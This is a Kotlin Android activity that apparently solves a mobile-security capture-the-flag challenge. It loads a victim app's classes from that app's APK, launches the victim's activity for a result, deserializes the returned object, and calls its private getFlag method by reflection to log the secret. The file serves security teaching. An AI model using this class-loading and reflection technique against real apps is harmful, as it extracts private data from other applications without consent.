package com.example.maliciousapp

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.PackageManager.ApplicationInfoFlags
import android.os.Bundle
import android.util.Log

import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

import dalvik.system.PathClassLoader

import java.io.Serializable

class MainActivity : AppCompatActivity() {
    val TAG = "MOBIOTSEC"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
    }

    override fun onStart() {
        super.onStart()
        getFlag()
    }

    @Suppress("UNCHECKED_CAST")
    private fun getFlag() {
        val apk = getPackageManager()
            .getApplicationInfo(
                "com.example.victimapp",
                ApplicationInfoFlags.of(
                    PackageManager
                        .GET_META_DATA
                        .toLong()
                )
            )
            .sourceDir
        val pathClassLoader = PathClassLoader(apk, classLoader)
        val containerClass = pathClassLoader
            .loadClass("com.example.victimapp.FlagContainer")
            as Class<Serializable>

        val intent = Intent().apply {
            component = ComponentName(
                "com.example.victimapp",
                "com.example.victimapp.SerialActivity"
            )
        }
        val contract = ActivityResultContracts.StartActivityForResult()
        registerForActivityResult(contract) { it.data?.let { extras ->
            extras.setExtrasClassLoader(pathClassLoader)
            val container = extras
                .getSerializableExtra("flag", containerClass)

            container?.let {
                val flag = it
                    .javaClass
                    .getDeclaredMethod("getFlag")
                    .apply { setAccessible(true) }
                    .invoke(it)
                Log.d(TAG, "The flag is $flag")
            }
        }}.launch(intent)
    }
}
